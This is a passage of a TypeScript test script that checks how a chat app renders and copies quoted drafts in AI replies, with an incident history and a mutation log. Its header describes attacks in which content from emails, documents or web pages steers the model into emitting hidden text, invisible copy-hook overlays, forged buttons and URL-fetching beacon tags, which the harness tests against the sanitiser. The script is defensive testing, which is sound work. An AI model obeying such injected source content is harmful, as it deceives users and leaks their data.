/**
 * Guards the draft a reply hands the user: drawn as a draft, copied as one.
 *
 * Run: npx tsx scripts/verify-chat-copy.ts
 *      npx tsx scripts/verify-chat-copy.ts --self-test
 *
 * ── THE INCIDENT ────────────────────────────────────────────────────────────
 *
 * 2026-09-23, thread 74a2b95f. Chris asked for a LinkedIn reply, then pasted
 * his own draft back for a tidy. The reply put the tidied message in a quote
 * block — every line "> ", blank lines a bare ">" — with commentary above and
 * below it. The renderer had no quote support, so it drew
 *
 *     <p class="ai-p">&gt; Hi Julie,<br>&gt;<br>&gt; Lovely to hear from you…
 *
 * a literal ">" at the start of every line on screen and on copy, and the
 * message's Copy button took the commentary along and kept the markers too.
 * 149 of 3,047 stored replies carry a quote block; earlier in the same thread
 * a reply offered two versions as bare paragraphs between commentary, so
 * copying one meant selecting it by hand.
 *
 * ── WHAT IS DRIVEN, AND WHY IT IS THE REAL THING ────────────────────────────
 *
 *   · the markdown goes through lib/ai/chat-markdown.ts and is sanitised in a
 *     real Chrome by sanitizeReply — the call MessageBubble makes, §1 pins
 *     it — against the real DOMPurify bundle: drop "data-quote-copy" from its
 *     attributes and the button survives sanitising as one that does nothing;
 *   · the stylesheet is app/globals.css through the project's own Tailwind,
 *     and the reply sits in the row, bubble and column classes read out of
 *     the components, at desk and phone width, light and dark;
 *   · the click goes to handleResponseClick in lib/ai/chat-copy.ts, loaded
 *     into the page from source, and §1 asserts that MessageBubble's
 *     .ai-response onClick is that call and nothing else — a check that
 *     clicked its own copy of the handler would prove the copy works;
 *   · the clipboard is Chrome's own, read back with navigator.clipboard.read(),
 *     then PASTED by Chrome's paste command — not by assigning a value — into
 *     a textarea (what any plain field takes) and two contenteditables, one
 *     with paragraph margins zeroed and one with the browser's own, because
 *     rich paste targets split exactly there: a composer that treats a <p>
 *     as one line, and one that gives it a margin. What is
 *     asserted there is what a reader SEES — the blank lines, measured as
 *     gaps between lines of text — not only what innerText says;
 *   · the message-level Copy is plainTextForCopy, which §1 asserts
 *     MessageBubble calls; the prompt is buildSystemPrompt in every gate
 *     combination; the scheduled email is markdownToEmailHtml;
 *   · Design Mode renders replies with lib/ai/lightweight-markdown.ts, which
 *     has no quote blocks. The rule may reach a Design Mode prompt only once
 *     that renderer draws the incident as a quote — asserted by rendering it;
 *   · and the reply is also written by an ADVERSARY. The model writes what
 *     its sources tell it to — an email, a Drive doc, a web page — and
 *     formatMarkdown passes raw HTML through. So a reply hides words with a
 *     class, lays a span with the copy hook invisibly over the page, forges
 *     the whole button inside an invisible layer, and carries ten raw tags
 *     that each fetch an outside URL when painted. Each attack is first shown
 *     LIVE — the hidden spans are in the DOM, the overlay is what a click
 *     lands on, every tag fetches under the options sanitizeReply replaced —
 *     because an attack that never reached the page proves nothing closed.
 *
 * Headless Chrome keeps its own clipboard, so this never touches the one on
 * the machine it runs on.
 *
 * ── MUTATION LOG ────────────────────────────────────────────────────────────
 *
 * --self-test re-breaks the REAL source in memory — each mutation is a text
 * edit to the file as it is on disk, loaded from a temp copy, never written
 * back — and refuses to report anything unless every mutation fires exactly
 * the detectors it declares. Declaring the set, not counting failures, is what
 * catches a mutation that goes red for the wrong reason.
 *
 * KILLED   no quote support (the shipped bug) → marker, structure, copy
 * KILLED   a lazy continuation line left out of the quote → structure,
 *          copytext, copyhtml, paste, spacing: the draft splits in two and the
 *          first button copies half a sentence
 * KILLED   the quote pass reaching inside code → structure, code, codecopy,
 *          style: the quote lands INSIDE the <pre>, and the code block's own
 *          Copy then picks up the quote button's label
 * KILLED   a ">" anywhere in a line opening a quote → structure, notaquote,
 *          and live, unseen, vocab: every raw tag in the hostile replies
 *          opens a quote too, so none of them reaches the page as written
 * KILLED   nested quotes flattened into the outer one → structure only. Copy
 *          cannot tell, because it flattens a nested quote by design
 * KILLED   no floor on quote depth → depth. Found by reading and then
 *          measured: ~2,000 levels of "> " on one line threw "Maximum call
 *          stack size exceeded" out of the render
 * KILLED   the button moved INSIDE the blockquote → copy. This SURVIVED
 *          until the handler learned to obey only the button formatMarkdown
 *          draws, where it draws it (2026-09-23); its place is load-bearing now
 * KILLED   the naive fix — innerHTML and textContent → copytext, copyhtml,
 *          paste, spacing, and ordinals and unseen: textContent drops every
 *          list number and takes hidden text along
 * KILLED   the rich write refused → fallback, copyhtml, paste. The fallback
 *          says so ("Copied as text"), and the paste records why that
 *          matters: plain text in a rich field gets a triple break per
 *          paragraph
 * KILLED   paragraphs as bare <p>, the blank line left to the margin →
 *          spacing ONLY. This was the first shape built here, and the shape a
 *          spec writes down: every textual assertion passes — words, line
 *          breaks, even innerText's paragraph breaks — and the proof paste of
 *          the real thread showed no blank line anywhere once paragraph
 *          margins were zeroed. The spacing detector exists because of it
 * KILLED   an empty <p> between bare <p>s → spacing: the obvious repair,
 *          wrong the other way — a triple gap under the browser's margins
 * KILLED   the citation chip copied with its link → copytext, paste. The
 *          first version of the walker HAD this bug and this check's first
 *          run caught it: in the paragraph after a list, a loose link was
 *          judged by its children and the link itself never seen
 * KILLED   a <br> copied as a space ("Cheers, Chris") → copytext, copyhtml, paste
 * KILLED   the code block's Copy lost in the move to chat-copy.ts → codecopy
 * KILLED   "data-quote-copy" dropped from sanitizeReply's attributes → copy
 *          (overlap and structure too: they find the button by the same
 *          attribute; live, because the overlay loses its hook with it).
 *          Under the options it replaced this SURVIVED, twice over, because
 *          they let every data-* attribute through; the allowlist names four
 * KILLED   data-* let through as a family again (ALLOW_DATA_ATTR) → vocab
 * KILLED   the draft styled as a quotation, italic and grey → style
 * KILLED   the button laid over the text (absolute, not floated) → overlap,
 *          at the two-version fixture only: the incident's "Hi Sam," is too
 *          short to reach it, which is why that fixture opens with a long
 *          line. And copy, restyle: lifted out of the flow, the real button
 *          looks to the handler exactly like an overlay, and is refused
 * KILLED   no frame → frame
 * KILLED   a card that only works in light mode → contrast (1.10:1 in dark)
 * KILLED   the message Copy keeping the markers → msgcopy
 * KILLED   the message Copy stripping markers inside code too → msgcopy
 * KILLED   the scheduled email without quote support → email
 * KILLED   the prompt rule deleted / dropped from one gate combination /
 *          filed in the volatile tail / contradicted by a planted "put drafts
 *          in a code block" → prompt, all four
 * KILLED   the rule put back into Design Mode → design. The verifier's
 *          finding (2026-09-23): the rule reached Design Mode through
 *          FORMATTING_GUIDELINES, whose renderer draws "> Big news from the
 *          studio" as a paragraph starting with ">" — the incident, caused
 *          by the fix for it
 *
 * The adversary's mutations, each a verifier's finding of 2026-09-23 or the
 * next variant of one:
 *
 * KILLED   sanitizeReply back to the options it replaced (DOMPurify's
 *          defaults plus the old ADD_ATTR list) → beacon, restyle, vocab.
 *          Ten tags fetched an outside URL, and a <style> in the reply set
 *          the Copy button to position: fixed
 * KILLED   the image hook removed → beacon, vocab
 * KILLED   the hook reading src only → vocab: an allowlisted src with an
 *          outside data-retry-src, which MessageBubble loads on the first
 *          error. It fetches nothing at paint, so beacon cannot see it and
 *          the vocabulary assertion is what does
 * KILLED   "style" back among the attributes → beacon, vocab
 * KILLED   <style> back among the tags → beacon, restyle, vocab
 * KILLED   the copy walker judging nothing hidden → unseen: "Please pay the
 *          invoice" copied with four hidden spans in it — the verifier's
 *          invoice, hidden by class now that style attributes are gone
 * KILLED   the click handler back to matching any [data-quote-copy] → hijack,
 *          twice: the overlay span made a click on blank page copy the quote
 *          under it with the real button still reading "Copy", and the forged
 *          button in the corner copied its payload
 * KILLED   inPlace answering yes → hijack, the forged button only: its markup
 *          is formatMarkdown's to the byte, so only where it sits gives it away
 * SURVIVED the exact-class test in drawn(). Every overlay the compiled
 *          stylesheet can build is out of flow or transparent, and inPlace
 *          refuses those first. It stays as the cheaper refusal
 * KILLED   a rebuilt <ol> without start or value → ordinals, copytext: the
 *          six-step prompt of message bbca2d2b copied as 1, 2, 1, 2, 1, 2
 * KILLED   htmlToMarkdown numbering every list from 1 again → ordinals,
 *          copytext: the html half right, the plain half renumbered
 *
 * AND ON DISK, in a detached worktree (2026-09-23), to prove the check reads
 * the files rather than its own copies of them:
 *
 * KILLED   MessageBubble's onClick back to the old inline handler → cannot run
 * KILLED   the message Copy back to its own regex chain → cannot run
 * KILLED   liftQuotes disabled → marker, structure, copy
 * KILLED   the rule deleted from FORMATTING_GUIDELINES → prompt (36 pairs)
 * KILLED   the email renderer's quote branch removed → email
 * KILLED   the copy walker back to textContent → copytext, copyhtml, paste, spacing
 * SURVIVED `display: flow-root` dropped from the frame. Measured: one line of
 *          body text is 26px and the button 24px, so the float outgrows the
 *          frame only while the block is empty — a streaming instant, 5px.
 *          globals.css says so beside the rule
 *
 * …and again on disk after the verifiers' findings (2026-09-23):
 *
 * KILLED   MessageBubble back to DOMPurify.sanitize with the old options →
 *          cannot run, here and in verify-chat-wrapping (the pinned call)
 * KILLED   the click handler back to any [data-quote-copy] → hijack, 2×
 * KILLED   seen() answering yes → unseen
 * KILLED   the rule back in every Design Mode prompt → design (8 prompts)
 * KILLED   a rebuilt <ol> without start → copytext, ordinals
 * KILLED   htmlToMarkdown numbering from 1 → copytext, ordinals here, and §3
 *          of verify-optimizer-export (3 fail)
 * KILLED   the image hook removed → beacon, vocab
 * KILLED   sanitizeReply back to DOMPurify's defaults, hook kept → beacon
 *          (seven tags), restyle, vocab
 */
import { readFileSync, existsSync, mkdtempSync, rmSync, writeFileSync } from "fs";
import { join } from "path";
import { tmpdir } from "os";
import { pathToFileURL } from "url";
import { execFileSync } from "child_process";
import { createServer } from "http";
import type { AddressInfo } from "net";
import * as ts from "typescript";
import * as realMd from "../lib/ai/chat-markdown";
import * as realEmail from "../lib/scheduled/email-html";
import { buildSystemPrompt } from "../lib/ai/system-prompts";
import { renderLightMarkdown } from "../lib/ai/lightweight-markdown";
import { splitVolatile, appendVolatile } from "../lib/ai/prompt-cache";

const root = join(__dirname, "..");
const read = (p: string) => readFileSync(join(root, p), "utf8");

let failures = 0;
let quiet = false;
const fail = (m: string) => { failures++; if (!quiet) console.log(`  ✗ ${m}`); };
const pass = (m: string) => { if (!quiet) console.log(`  ✓ ${m}`); };
const assert = (ok: boolean, m: string) => (ok ? pass(m) : fail(m));

/* ─── The code under test, lifted out of the components ───────────────────── */

/** One capture, or a loud failure: a check that quietly matched nothing
 *  tests nothing and reads as a pass. */
function captureOnce(file: string, re: RegExp, label: string): string[] {
  const src = read(file);
  const all = src.match(new RegExp(re.source, re.flags.indexOf("g") >= 0 ? re.flags : re.flags + "g"));
  if (!all || all.length !== 1) {
    console.log(`\n✗ cannot run: ${label} — ${(all || []).length} matches in ${file}, expected exactly 1.`);
    console.log(`  The markup moved. Re-anchor this check before trusting it.\n`);
    process.exit(1);
  }
  const m = re.exec(src);
  if (!m) { console.log(`\n✗ cannot run: ${label}\n`); process.exit(1); }
  return m.slice(1);
}

const BUBBLE = "components/ai-writer/MessageBubble.tsx";
const PANEL = "components/ai-writer/ChatPanel.tsx";
const MD_FILE = "lib/ai/chat-markdown.ts";
const COPY_FILE = "lib/ai/chat-copy.ts";
const EXPORT_FILE = "lib/optimizer/export.ts";
const EMAIL_FILE = "lib/scheduled/email-html.ts";

/** The sanitiser MessageBubble runs. The page runs the same function out of
 *  chat-markdown.ts, so pinning the call is what makes that the real one. */
const sanitizeCall = captureOnce(
  BUBBLE,
  /__html: (sanitizeReply)\(DOMPurify, formatMarkdown\(cleanContent, sources\)\)/,
  "the sanitiser MessageBubble runs"
);
const sanitizeImport = captureOnce(
  BUBBLE,
  /import \{[^}]*\b(sanitizeReply)\b[^}]*\} from "@\/lib\/ai\/chat-markdown";/,
  "where the sanitiser comes from"
);
const clickCall = captureOnce(
  BUBBLE,
  /className="ai-response"(?:\s*\/\/[^\n]*)*\s*onClick=\{\(e\) => (handleResponseClick)\(e\.target\)\}/,
  "the reply container's click handler"
);
const clickImport = captureOnce(
  BUBBLE,
  /import \{ (handleResponseClick) \} from "@\/lib\/ai\/chat-copy";/,
  "where the click handler comes from"
);
const msgCopyCall = captureOnce(
  BUBBLE,
  /navigator\.clipboard\.writeText\((plainTextForCopy)\(content\)\)/,
  "the message-level Copy"
);
const rowCls = captureOnce(
  BUBBLE,
  /className=\{cn\(\s*"(flex gap-2[^"]*)",\s*isUser \? "([^"]*)" : "([^"]*)"\s*\)\}/,
  "the message row's classes"
);
const bubbleCls = captureOnce(
  BUBBLE,
  /"(rounded-xl text-\[16px\])",\s*isUser\s*(?:\/\/[^\n]*\n\s*)*\?\s*(?:\/\/[^\n]*\n\s*)*"([^"]*)"\s*:\s*"([^"]*)"/,
  "the bubble's classes"
);
const columnCls = captureOnce(PANEL, /<div className="(py-4 space-y-1[^"]*)">/, "the 46rem column");

/* ─── Fixtures ────────────────────────────────────────────────────────────── */

/** What one quote block must copy as. */
interface Want {
  /** text/plain, exactly. Its blank lines are also the blank lines the
   *  pasted rich text must SHOW. */
  plain: string;
  /** Paragraphs and in-paragraph line breaks in text/html, exactly. */
  paras: number;
  brs: number;
  /** What a contenteditable shows once the html half is pasted into it —
   *  bullets and a link's URL are formatting there, not text. Defaults to
   *  `plain`. */
  pasted?: string;
}

interface Fixture {
  key: string;
  what: string;
  md: string;
  /** Top-level quote blocks, and quotes nested inside them. */
  quotes: number;
  nested: number;
  blocks: Want[];
  /** Text that must reach the screen untouched. */
  mustShow?: string[];
  /** Text that must survive inside a code block or a content card. */
  codeKeeps?: string[];
  /** The message-level Copy, exactly, where it is pinned. */
  msgCopy?: string;
}

/** The incident's shape, with the words changed: it is Chris's own letter to
 *  a friend, and this file is committed. Commentary, a quote whose blank
 *  lines are a bare ">", a two-line sign-off, commentary. */
const INCIDENT = [
  "That reads well, and it lands the point without overselling it. A couple of small tightens if you want them:",
  "",
  "> Hi Sam,",
  ">",
  "> Lovely to hear from you. Zurich is a good base, so that's a nice mix.",
  ">",
  "> I then set up a content agency, which I've been running since.",
  ">",
  "> Would be great to catch up properly once you're settled!",
  ">",
  "> Cheers,",
  "> Chris",
  "",
  "Changes: \"setup\" → \"set up\", and a stray \"it\" is gone. Everything else is exactly as you had it.",
].join("\n");
const INCIDENT_DRAFT =
  "Hi Sam,\n\nLovely to hear from you. Zurich is a good base, so that's a nice mix.\n\n" +
  "I then set up a content agency, which I've been running since.\n\n" +
  "Would be great to catch up properly once you're settled!\n\nCheers,\nChris";

const LONG_FIRST =
  "Since we last caught up I've been building out The Content Engine, based in Switzerland, and the big " +
  "focus right now is AI authority: helping brands get cited in AI answers rather than only ranked by Google.";

const FIXTURES: Fixture[] = [
  {
    key: "incident",
    what: "the incident: commentary, a draft in a quote, commentary",
    md: INCIDENT,
    quotes: 1,
    nested: 0,
    blocks: [{ plain: INCIDENT_DRAFT, paras: 5, brs: 1 }],
    msgCopy:
      "That reads well, and it lands the point without overselling it. A couple of small tightens if you want them:\n\n" +
      INCIDENT_DRAFT +
      "\n\nChanges: \"setup\" → \"set up\", and a stray \"it\" is gone. Everything else is exactly as you had it.",
  },
  {
    // 140 of the stored blocks open directly under a label line with no blank
    // line between, which only works if a quote can interrupt a paragraph.
    key: "two-versions",
    what: "two versions, each directly under its label",
    md: [
      "Here are two versions.",
      "",
      "**Longer, for an email:**",
      `> ${LONG_FIRST}`,
      ">",
      "> Happy to show you what that looks like.",
      "",
      "**Shorter, for LinkedIn:**",
      "> Big focus right now is AI authority — helping brands get properly cited in AI answers, not just Google.",
      "",
      "Either works; the second is punchier.",
    ].join("\n"),
    quotes: 2,
    nested: 0,
    blocks: [
      { plain: `${LONG_FIRST}\n\nHappy to show you what that looks like.`, paras: 2, brs: 0 },
      { plain: "Big focus right now is AI authority — helping brands get properly cited in AI answers, not just Google.", paras: 1, brs: 0 },
    ],
  },
  {
    key: "lazy",
    what: "a lazy continuation line (CommonMark: it belongs to the quote)",
    md: [
      "> Thanks for the note — the draft is attached and the",
      "figures are the ones we agreed on Tuesday.",
      ">",
      "> Best,",
      "> Chris",
      "",
      "That should do it.",
    ].join("\n"),
    quotes: 1,
    nested: 0,
    blocks: [{
      plain: "Thanks for the note — the draft is attached and the\nfigures are the ones we agreed on Tuesday.\n\nBest,\nChris",
      paras: 2,
      brs: 2,
    }],
  },
  {
    key: "nested",
    what: "a quote inside a quote (nested on screen, flattened on copy)",
    md: [
      "> Hi both,",
      ">",
      "> > The launch moves to 14 October.",
      ">",
      "> Confirming that works our end.",
    ].join("\n"),
    quotes: 1,
    nested: 1,
    blocks: [{ plain: "Hi both,\n\nThe launch moves to 14 October.\n\nConfirming that works our end.", paras: 3, brs: 0 }],
  },
  {
    key: "rich",
    what: "bold, a list, a link with its citation chip, a sign-off",
    md: [
      "Draft below.",
      "",
      "> **Subject:** Catch-up",
      ">",
      "> Good to see you. The two things I mentioned:",
      ">",
      "> - the audit, which is ready",
      "> - the deck, which is not",
      ">",
      "> You can [book a call](https://example.com/book) whenever suits.",
      ">",
      "> Cheers,",
      "> Chris",
    ].join("\n"),
    quotes: 1,
    nested: 0,
    blocks: [{
      plain:
        "Subject: Catch-up\n\nGood to see you. The two things I mentioned:\n\n- the audit, which is ready\n- the deck, which is not\n\n" +
        "You can book a call (https://example.com/book) whenever suits.\n\nCheers,\nChris",
      paras: 4,
      brs: 1,
      pasted:
        "Subject: Catch-up\n\nGood to see you. The two things I mentioned:\n\nthe audit, which is ready\nthe deck, which is not\n\n" +
        "You can book a call whenever suits.\n\nCheers,\nChris",
    }],
  },
  {
    // formatMarkdown splits a numbered list wherever something interrupts it
    // and keeps the screen's numbers with each item's value; the copy has to
    // keep them too. The first block is the verifier's (a sub-bullet the list
    // pass leaves as a loose line), the second a list resumed after a line.
    key: "ordered",
    what: "numbered lists broken by a sub-bullet and by a line of text",
    md: [
      "Steps for the handover:",
      "",
      "> 1. Open the file",
      ">    - carefully",
      "> 2. Edit it",
      "> 3. Save it",
      "",
      "And the plan:",
      "",
      "> Here is the plan:",
      ">",
      "> 1. Draft the brief",
      "> 2. Book the call",
      ">",
      "> Then, once agreed:",
      ">",
      "> 3. Send the contract",
      "> 4. Start work",
    ].join("\n"),
    quotes: 2,
    nested: 0,
    blocks: [
      {
        plain: "1. Open the file\n\n- carefully\n\n2. Edit it\n3. Save it",
        paras: 1,
        brs: 0,
        pasted: "Open the file\n\n- carefully\n\nEdit it\nSave it",
      },
      {
        plain: "Here is the plan:\n\n1. Draft the brief\n2. Book the call\n\nThen, once agreed:\n\n3. Send the contract\n4. Start work",
        paras: 2,
        brs: 0,
        pasted: "Here is the plan:\n\nDraft the brief\nBook the call\n\nThen, once agreed:\n\nSend the contract\nStart work",
      },
    ],
  },
  {
    key: "not-a-quote",
    what: "a \">\" that is not at the start of a line",
    md: "Revenue > $5m qualifies, and margin > 20% is the second test.\nA line with a > in the middle stays a line.",
    quotes: 0,
    nested: 0,
    blocks: [],
    mustShow: ["Revenue > $5m qualifies, and margin > 20% is the second test.", "A line with a > in the middle stays a line."],
  },
  {
    key: "code",
    what: "quote markers inside a code block and a content card",
    md: [
      "Run this:",
      "",
      "```text",
      "> quoted inside a code block",
      "> stays exactly as written",
      "```",
      "",
      "And the card:",
      "",
      "```",
      "> inside a content card",
      "```",
    ].join("\n"),
    quotes: 0,
    nested: 0,
    blocks: [],
    codeKeeps: ["> quoted inside a code block\n> stays exactly as written", "> inside a content card"],
  },
];

function fixtureNamed(key: string): Fixture {
  for (let i = 0; i < FIXTURES.length; i++) if (FIXTURES[i].key === key) return FIXTURES[i];
  console.log(`\n✗ cannot run: no "${key}" fixture.\n`);
  process.exit(1);
}

/** Where the page is measured. Copying does not depend on either, so it is
 *  driven once, at the first. */
const COMBOS: { width: number; theme: "light" | "dark" }[] = [
  { width: 1280, theme: "light" },
  { width: 1280, theme: "dark" },
  { width: 375, theme: "light" },
  { width: 375, theme: "dark" },
];

/* ─── Loading the code under test, mutated or not ─────────────────────────── */

interface Mutation {
  md?: (src: string) => string;
  copy?: (src: string) => string;
  exp?: (src: string) => string;
  email?: (src: string) => string;
  css?: (css: string) => string;
  prompt?: (text: string, label: string) => string;
}
const NONE: Mutation = {};

let scratch = "";
let loads = 0;
/** A mutated copy of an import-free module, from a temp dir. The unmutated
 *  run imports the file itself. */
async function loadMutated(file: string, fn: (src: string) => string): Promise<any> {
  if (!scratch) scratch = mkdtempSync(join(tmpdir(), "chatcopy-"));
  const src = read(file);
  const out = fn(src);
  if (out === src) throw new Error(`mutation of ${file} changed nothing — re-anchor it`);
  const p = join(scratch, `m${++loads}-${file.split("/").pop()}`);
  writeFileSync(p, out);
  return import(pathToFileURL(p).href);
}

/** A source file as the page gets it: mutated when the run says so, and a
 *  mutation that changes nothing is a loud failure, not a quiet survivor. */
function sourceOf(file: string, fn?: (src: string) => string): string {
  const src = read(file);
  if (!fn) return src;
  const out = fn(src);
  if (out === src) throw new Error(`mutation of ${file} changed nothing — re-anchor it`);
  return out;
}

/** chat-markdown.ts (for sanitizeReply), chat-copy.ts and the one module it
 *  imports, as a script the page can run. TypeScript's own transpiler,
 *  module by module: the harness knows exactly these imports, and refuses to
 *  guess at another. */
function pageBundle(mut: Mutation): string {
  const cjs = (src: string) =>
    ts.transpileModule(src, { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2019 } }).outputText;
  const copySrc = sourceOf(COPY_FILE, mut.copy);
  return `
var ChatMd = (function () {
  var mdMod = { exports: {} };
  (function (require, module, exports) {
${cjs(sourceOf(MD_FILE, mut.md))}
  })(function () { throw new Error("chat-markdown.ts has no imports"); }, mdMod, mdMod.exports);
  return mdMod.exports;
})();
var ChatCopy = (function () {
  var exportMod = { exports: {} };
  (function (require, module, exports) {
${cjs(sourceOf(EXPORT_FILE, mut.exp))}
  })(function () { throw new Error("export.ts has no imports"); }, exportMod, exportMod.exports);
  var copyMod = { exports: {} };
  (function (require, module, exports) {
${cjs(copySrc)}
  })(function (name) {
    if (name === "@/lib/optimizer/export") return exportMod.exports;
    throw new Error("chat-copy.ts imports " + name + ", which this harness does not load");
  }, copyMod, copyMod.exports);
  return copyMod.exports;
})();`;
}

function importsOf(file: string): string[] {
  const out: string[] = [];
  const re = /^import[^;]*?from "([^"]+)";/gm;
  const src = read(file);
  let m: RegExpExecArray | null;
  while ((m = re.exec(src)) !== null) out.push(m[1]);
  return out;
}

function compileCss(): string {
  const dir = mkdtempSync(join(tmpdir(), "chatcopy-css-"));
  const out = join(dir, "harness.css");
  try {
    execFileSync(
      "npx",
      ["tailwindcss", "-c", "tailwind.config.ts", "-i", "app/globals.css", "-o", out],
      { cwd: root, stdio: ["ignore", "ignore", "pipe"] }
    );
    return readFileSync(out, "utf8");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

/* ─── The page ────────────────────────────────────────────────────────────── */

function harness(css: string, bundle: string, formatted: string, theme: string): string {
  const purify = readFileSync(join(root, "node_modules/dompurify/dist/purify.min.js"), "utf8");
  return `<!doctype html><html class="${theme === "dark" ? "dark" : ""}"><head><meta charset="utf-8">
<style>${css}</style>
<style>
  /* Harness only: the app shell pins body at 100% and hides overflow, which
     would hide the very overflow this measures. */
  html, body { margin: 0; padding: 0; }
  body { overflow: visible !important; height: auto !important; }
</style>
<script>${purify}</script>
<script>${bundle}</script>
</head><body>
<div class="${columnCls[0]}">
  <div class="${rowCls[0]} ${rowCls[2]}">
    <div class="shrink-0 h-7 w-7 rounded-full"></div>
    <div class="${bubbleCls[0]} ${bubbleCls[2]}">
      <div class="ai-response" id="ai"></div>
    </div>
  </div>
</div>
<!-- Two rich fields, because paste targets disagree about paragraph margins:
     #ce sits under the compiled preflight (every margin zeroed — the regime of
     editors that model a <p> as one line), #ce-ua has the browser's own
     margins back (the regime of a classic mail composer). -->
<style>
  .paste-field { position: fixed; left: -9999px; top: 0; width: 600px; font: 16px/20px sans-serif; }
  #ce-ua :is(p, div, ul, ol, li, h1, h2, h3, h4) { margin: revert; padding: revert; }
</style>
<textarea id="ta" class="paste-field" style="height:200px"></textarea>
<div id="ce" class="paste-field" contenteditable="true"></div>
<div id="ce-ua" class="paste-field" contenteditable="true"></div>
<script>
  var ai = document.getElementById("ai");
  // MessageBubble: __html: sanitizeReply(DOMPurify, formatMarkdown(…)) — §1 pins it.
  ai.innerHTML = ChatMd.sanitizeReply(DOMPurify, ${JSON.stringify(formatted)});
  // MessageBubble: onClick={(e) => handleResponseClick(e.target)} — §1 pins it.
  ai.addEventListener("click", function (e) { ChatCopy.handleResponseClick(e.target); });
</script>
</body></html>`;
}

/** Everything the rendering can be asked, in one pass. */
const MEASURE = `(() => {
  const ai = document.getElementById("ai");
  // What a reader SEES as lines: innerText, with code, cards and the button
  // labels taken out of the flow first. A ">" inside a code block is code.
  const hide = document.createElement("style");
  hide.textContent = "#ai pre, #ai .ai-content-card, #ai button { display: none !important; }";
  document.head.appendChild(hide);
  const shown = ai.innerText;
  hide.remove();
  const markerLines = shown.split("\\n").filter(function (l) { return /^\\s*>/.test(l); });
  const code = [];
  const codeEls = ai.querySelectorAll("pre, .ai-content-card");
  for (let i = 0; i < codeEls.length; i++) code.push(codeEls[i].textContent || "");

  const rgb = function (s) {
    const m = /rgba?\\(([^)]+)\\)/.exec(s || "");
    if (!m) return null;
    const p = m[1].split(/[\\s,\\/]+/).filter(Boolean).map(Number);
    return { r: p[0], g: p[1], b: p[2], a: p.length > 3 ? p[3] : 1 };
  };
  const over = function (c, under) {
    if (!c) return under;
    return { r: c.r * c.a + under.r * (1 - c.a), g: c.g * c.a + under.g * (1 - c.a), b: c.b * c.a + under.b * (1 - c.a), a: 1 };
  };
  const lum = function (c) {
    const f = function (v) { v = v / 255; return v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4); };
    return 0.2126 * f(c.r) + 0.7152 * f(c.g) + 0.0722 * f(c.b);
  };
  const contrast = function (a, b) { const x = lum(a), y = lum(b); return (Math.max(x, y) + 0.05) / (Math.min(x, y) + 0.05); };
  const pageBg = over(rgb(getComputedStyle(document.body).backgroundColor), { r: 255, g: 255, b: 255, a: 1 });

  const wraps = ai.querySelectorAll(".ai-quote-wrap");
  const top = ai.querySelector(":scope > p.ai-p");
  const topCs = top ? getComputedStyle(top) : null;
  const quotes = [];
  for (let w = 0; w < wraps.length; w++) {
    const wrap = wraps[w];
    const bq = wrap.querySelector("blockquote.ai-quote");
    // The draft's body type: its first paragraph, or — for a block that is
    // all list — its first item.
    const ps = bq ? bq.querySelectorAll("p.ai-p") : [];
    const p = ps.length ? ps[0] : bq ? bq.querySelector("li") : null;
    const cs = p ? getComputedStyle(p) : null;
    const wcs = getComputedStyle(wrap);
    const bg = over(rgb(wcs.backgroundColor), pageBg);
    const fg = cs ? over(rgb(cs.color), bg) : null;
    const border = over(rgb(wcs.borderTopColor), pageBg);
    const delta = Math.abs(bg.r - pageBg.r) + Math.abs(bg.g - pageBg.g) + Math.abs(bg.b - pageBg.b);
    const btn = wrap.querySelector("[data-quote-copy]");
    const br = btn ? btn.getBoundingClientRect() : null;
    const wr = wrap.getBoundingClientRect();
    let overlaps = 0;
    if (btn && bq) {
      const tw = document.createTreeWalker(bq, NodeFilter.SHOW_TEXT, null);
      while (tw.nextNode()) {
        // The button's own label is not text it can sit on.
        if (tw.currentNode.parentElement && tw.currentNode.parentElement.closest("button")) continue;
        const r = document.createRange();
        r.selectNodeContents(tw.currentNode);
        const rects = r.getClientRects();
        for (let k = 0; k < rects.length; k++) {
          const q = rects[k];
          if (q.width === 0) continue;
          if (q.left < br.right - 0.5 && q.right > br.left + 0.5 && q.top < br.bottom - 0.5 && q.bottom > br.top + 0.5) overlaps++;
        }
      }
    }
    quotes.push({
      fontStyle: cs ? cs.fontStyle : "",
      fontSize: cs ? cs.fontSize : "",
      fontWeight: cs ? cs.fontWeight : "",
      color: cs ? cs.color : "",
      topFontSize: topCs ? topCs.fontSize : null,
      topFontWeight: topCs ? topCs.fontWeight : null,
      topColor: topCs ? topCs.color : null,
      contrast: fg ? contrast(fg, bg) : 0,
      framed: (parseFloat(wcs.borderTopWidth) >= 1 && contrast(border, pageBg) >= 1.1) || delta >= 6,
      buttonInside: !!br && br.width > 0 && br.height > 0 &&
        br.left >= wr.left - 0.5 && br.right <= wr.right + 0.5 && br.top >= wr.top - 0.5 && br.bottom <= wr.bottom + 0.5,
      overlaps: overlaps,
      over: wrap.scrollWidth - wrap.clientWidth,
    });
  }
  const de = document.documentElement;
  return {
    quotes: ai.querySelectorAll(".ai-quote-wrap > blockquote.ai-quote").length,
    nested: ai.querySelectorAll("blockquote.ai-quote-nested").length,
    buttons: ai.querySelectorAll("[data-quote-copy]").length,
    markerLines: markerLines,
    shown: shown,
    code: code,
    styles: quotes,
    docOver: de.scrollWidth - de.clientWidth,
  };
})()`;

const CLIP = `(async () => {
  const items = await navigator.clipboard.read();
  const out = { types: [], plain: null, html: null };
  for (let i = 0; i < items.length; i++) {
    const it = items[i];
    for (let j = 0; j < it.types.length; j++) {
      const t = it.types[j];
      out.types.push(t);
      const txt = await (await it.getType(t)).text();
      if (t === "text/plain") out.plain = txt;
      if (t === "text/html") out.html = txt;
    }
  }
  return out;
})()`;

const SENTINEL = "__nothing was copied__";

/** The numbers an HTML list shows, by HTML's own rule: from the list's start
 *  (1 without one), and an item with a value resets the count. Run on the
 *  block on screen and on the html half, so both are read the same way. */
const ORDINALS = `function (root) {
  var out = [];
  if (!root) return out;
  var ols = root.querySelectorAll("ol");
  for (var i = 0; i < ols.length; i++) {
    var n = ols[i].hasAttribute("start") ? parseInt(ols[i].getAttribute("start"), 10) : 1;
    var lis = ols[i].children;
    for (var j = 0; j < lis.length; j++) {
      if (lis[j].tagName !== "LI") continue;
      if (lis[j].hasAttribute("value")) n = parseInt(lis[j].getAttribute("value"), 10);
      out.push(n);
      n++;
    }
  }
  return out;
}`;

/** What each paste target now holds, and the blank lines it SHOWS: a gap
